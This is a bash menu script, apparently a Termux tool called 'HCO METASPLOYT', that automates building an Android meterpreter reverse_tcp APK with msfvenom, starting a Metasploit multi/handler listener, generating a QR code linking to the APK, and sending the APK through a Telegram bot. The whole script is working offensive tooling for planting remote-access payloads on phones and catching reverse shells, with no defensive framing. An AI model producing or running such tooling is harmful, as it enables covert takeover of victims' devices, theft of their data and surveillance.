#!/bin/bash

# Clear the screen
clear

# Check if figlet is installed
if ! command -v figlet &> /dev/null
then
    echo "Installing figlet..."
    pkg install figlet -y > /dev/null 2>&1 || apt install figlet -y > /dev/null 2>&1
fi

# Print banner using figlet
echo -e "\e[1;32m"
figlet -c "HCO"
figlet -c "METASPLOYT"
echo -e "\e[1;33m****************************************************************************************\e[0m"
echo -e "\e[1;31m           HCO METASPLOYT BY @the_silent_hacker_raj 
     \e[0m"
echo -e "\e[1;33m****************************************************************************************\e[0m"
echo ""

# Main menu
echo -e "\e[1;32m[1] Create Android Payload"
echo -e "\e[1;36m[2] Start Metasploit Listener"
echo -e "\e[1;34m[3] Generate QR Code (for APK)"
echo -e "\e[1;31m[4] Send APK via Telegram Bot"
echo -e "\e[1;33m[5] Exit\e[0m"
echo ""

# User input
read -p $'\e[1;37mSelect Option [1-5]: \e[0m' option

# Handle options
case $option in
    1)
        echo -e "\e[1;32m[*] Creating Android Payload...\e[0m"
        read -p "Enter LHOST (your IP): " lhost
        read -p "Enter LPORT (e.g. 4444): " lport
        read -p "Enter output APK name (e.g. payload.apk): " apkname
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $apkname
        echo -e "\e[1;32m[+] Payload saved as $apkname\e[0m"
        ;;
    2)
        echo -e "\e[1;36m[*] Starting Metasploit Listener...\e[0m"
        read -p "Enter LHOST (your IP): " lhost
        read -p "Enter LPORT (e.g. 4444): " lport
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
        ;;
    3)
        echo -e "\e[1;34m[*] Generating QR Code...\e[0m"
        read -p "Enter URL for APK: " apkurl
        if ! command -v qrencode &> /dev/null
        then
            echo "Installing qrencode..."
            pkg install qrencode -y > /dev/null 2>&1 || apt install qrencode -y > /dev/null 2>&1
        fi
        qrencode -o apkqr.png "$apkurl"
        echo -e "\e[1;34m[+] QR Code saved as apkqr.png\e[0m"
        ;;
    4)
        echo -e "\e[1;31m[*] Sending APK via Telegram Bot...\e[0m"
        read -p "Enter your Telegram Bot Token: " token
        read -p "Enter your Telegram Chat ID: " chat_id
        read -p "Enter APK file name: " apkfile
        curl -F document=@"$apkfile" "https://api.telegram.org/bot$token/sendDocument?chat_id=$chat_id"
        echo -e "\e[1;31m[+] Sent APK to Telegram!\e[0m"
        ;;
    5)
        echo -e "\e[1;33m[!] Exiting... Bye!\e[0m"
        exit
        ;;
    *)
        echo -e "\e[1;31m[!] Invalid option!\e[0m"
        ;;
esac
